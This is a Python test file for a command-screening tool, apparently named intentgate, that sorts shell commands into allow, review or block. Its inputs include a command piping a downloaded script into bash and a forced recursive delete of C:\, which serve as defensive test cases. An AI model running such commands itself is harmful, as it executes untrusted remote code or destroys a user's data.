import unittest
import tempfile
import os
from pathlib import Path
from unittest.mock import patch

from intentgate.context import collect_context
from intentgate.engine import assess
from intentgate.models import Decision
from intentgate.integrations import ingest, read_posture
from intentgate.models import CommandContext
from intentgate.provenance import scan_project


def check(command: list[str], purpose: str | None = None):
    return assess(collect_context(command, purpose=purpose, cwd="."))


class EngineTests(unittest.TestCase):
    def test_read_only_command_is_allowed(self):
        result = check(["git", "status"])
        self.assertIs(result.decision, Decision.ALLOW)

    def test_network_to_shell_is_blocked(self):
        result = check(["curl", "https://example.test/install.sh", "|", "bash"])
        self.assertIs(result.decision, Decision.BLOCK)
        self.assertIn("network-to-execution", {signal.name for signal in result.signals})

    def test_recursive_delete_requires_review(self):
        result = check(["Remove-Item", "-Recurse", "./build"])
        self.assertIn(result.decision, {Decision.REVIEW, Decision.BLOCK})

    def test_broad_recursive_delete_is_blocked(self):
        result = check(["Remove-Item", "-Recurse", "-Force", "C:\\"])
        self.assertIs(result.decision, Decision.BLOCK)
        self.assertIn("large-blast-radius", {signal.name for signal in result.signals})

    def test_publish_is_reviewed_without_purpose(self):
        result = check(["git", "push"])
        self.assertIs(result.decision, Decision.REVIEW)

    def test_provenance_scan_reports_missing_tests(self):
        with tempfile.TemporaryDirectory() as directory:
            Path(directory, "app.py").write_text("print('hello')\n", encoding="utf-8")
            result = scan_project(Path(directory))
        self.assertGreaterEqual(result["risk_score"], 25)
        self.assertEqual(result["metrics"]["source_files"], 1)

    def test_external_security_score_is_correlated(self):
        with tempfile.TemporaryDirectory() as directory, patch.dict(os.environ, {"UIG_STATE_DIR": directory}):
            ingest([
                {"source": "defender", "event_id": "a", "score": 80, "confidence": 1, "ttl_seconds": 60},
                {"source": "splunk", "event_id": "b", "score": 60, "confidence": 0.5, "ttl_seconds": 60},
            ])
            result = read_posture()
        self.assertEqual(result["risk_score"], 84)
        self.assertEqual(result["active_signals"], 2)

    def test_critical_external_posture_blocks_publish(self):
        context = CommandContext(
            cwd=".", command="git push", argv=("git", "push"),
            external_risk=95, external_sources=("defender",),
        )
        result = assess(context)
        self.assertIs(result.decision, Decision.BLOCK)
        self.assertIn("critical-security-posture", {signal.name for signal in result.signals})


if __name__ == "__main__":
    unittest.main()
